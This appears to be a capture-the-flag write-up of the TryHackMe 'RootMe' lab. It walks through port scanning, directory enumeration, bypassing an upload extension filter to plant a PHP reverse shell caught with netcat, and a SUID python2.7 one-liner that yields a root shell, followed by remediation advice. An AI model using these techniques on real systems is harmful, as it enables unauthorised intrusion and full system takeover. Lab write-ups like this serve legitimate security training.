# RootMe — TryHackMe — Easy — Web

**Date Completed:** 23 sep 2026
**Time to Root:** 1 hour
**User Flag:** `www-data shell (no discrete user.txt captured)`
**Root Flag:** `THM{pr1v1l3g3_3sc4l4t10n}`

---

## Executive Summary

RootMe is a beginner-level web exploitation machine. The core vulnerability is an unrestricted file upload on a custom PHP upload panel, which allowed a PHP reverse shell to be uploaded by bypassing a weak client/extension-based filter. From there, a misconfigured SUID binary allowed full privilege escalation to root.

---

## Scope and Methodology

- **Target IP:** 10.82.156.196
- **Platform:** TryHackMe
- **Category:** Web
- **Methodology:** Reconnaissance — Enumeration — Exploitation — Privilege Escalation

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sV -sC -p- -T4 -oN nmap-initial.txt 10.82.156.196
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 8.2p1 (Ubuntu) | Standard SSH, not the entry point |
| 80 | HTTP | Apache 2.4.41 (Ubuntu) | Custom "HackIT" themed site, entry point |

---

## Enumeration

Browsed to the site homepage — a static themed page ("Can you root me?") with no visible links or content of interest.

Ran directory enumeration with Gobuster:

```bash
gobuster dir -u http://10.82.156.196 -w /usr/share/wordlists/dirb/common.txt -o rootme-gobuster.txt
```

Found two directories of interest:
- `/panel/` — a file upload form
- `/uploads/` — where uploaded files are served back from

---

## Exploitation

**Vulnerability Class:** Unrestricted File Upload (CWE-434)

The upload panel at `/panel/` rejected files with a `.php` extension, indicating a naive extension-based filter rather than proper content validation. Renaming the payload to a `.php5` extension bypassed the filter, since Apache was still configured to execute `.php5` files as PHP.

Steps taken:
1. Copied `php-reverse-shell.php` and edited the `$ip` and `$port` variables to point to my Kali VM's `tun0` VPN tunnel IP and port 4444.
2. Attempted to upload `shell.php` — rejected by the server's extension filter.
3. Renamed the file to `shell.php5` and re-uploaded — accepted.
4. Started a listener: `nc -lvnp 4444`
5. Triggered execution by browsing to `http://10.82.156.196/uploads/shell.php5`
6. Received a reverse shell as `www-data`.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php
# edited $ip and $port
cp ~/shell.php ~/shell.php5
nc -lvnp 4444
```


---

## Privilege Escalation

Enumerated SUID binaries on the target:

```bash
find / -perm /4000 2>/dev/null
```

`/usr/bin/python2.7` stood out as SUID-root — an interpreter should never have the SUID bit set, since it can be trivially abused to spawn a privileged shell.

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

The `-p` flag preserves the elevated privileges granted by the SUID bit when spawning the new shell, resulting in a root shell.

---

## Proof of Completion

```
THM{pr1v1l3g3_3sc4l4t10n}

```

---

## Vulnerability Analysis

| Finding | Severity | CVSS | MITRE ATT&CK | CWE |
|---------|----------|------|--------------|-----|
| Unrestricted file upload (extension filter bypass) | High | 8.1 | T1190 | CWE-434 |
| SUID Python interpreter (privilege escalation) | High | 7.8 | T1548.001 | CWE-250 |

---

## Remediation

1. **Unrestricted File Upload:** Validate uploads server-side using MIME type/content inspection, 
not just file extension. Whitelist only expected file types. Store uploaded files outside the web root, 
or serve them from a location where script execution is disabled.
2. **SUID Python Binary:** Never assign the SUID bit to interpreters 
(Python, Perl, etc.) — they can always be abused to execute arbitrary commands with the owner's privileges. 
Audit SUID binaries regularly with `find / -perm /4000` and remove the bit from anything that doesn't 
strictly require it.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service detection |
| Gobuster | Directory/content discovery |
| Firefox | Manual web app interaction and payload triggering |
| Netcat | Catching the reverse shell |
| php-reverse-shell.php | Reverse shell payload 

---

## Lessons Learned

- Client-side or extension-only upload filters are trivially bypassed by renaming files to alternate extensions the web server still executes (e.g. `.php5`).
- SUID bits on interpreters are a critical misconfiguration — GTFOBins (gtfobins.github.io) documents this and many other SUID/sudo abuse techniques.
- Netcat reverse shells often lack a proper TTY, which can make output look like it's "hanging" when it's actually just waiting silently for input — always type commands even without a visible prompt.
